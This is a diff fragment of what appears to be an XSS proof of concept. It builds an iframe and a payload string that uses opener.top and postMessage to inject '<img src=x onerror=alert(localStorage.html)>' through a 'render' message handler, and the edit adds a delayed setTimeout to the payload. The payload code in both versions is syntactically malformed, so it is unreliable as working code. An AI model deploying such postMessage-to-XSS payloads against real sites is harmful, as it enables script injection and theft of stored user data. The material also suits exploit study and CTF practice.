@@ -9,7 +9,7 @@
 
 <script>
 let iframe=document.createElement("iframe");
-let payload="x=opener.top; opener.postMessage(1,'*'); setTimeout(() => {x.postMessage(type: 'render', body:'<img src=x onerror=alert(localStorage.html)>'),'*'}";
+let payload="x=opener.top; opener.postMessage(1,'*'); setTimeout(() => ({x.postMessage(type: 'render', body:'<img src=x onerror=alert(localStorage.html)>'),'*'},1000)";
 iframe.srcdoc=`<h1>hello</h1>
 <script>
  onclick = e => {
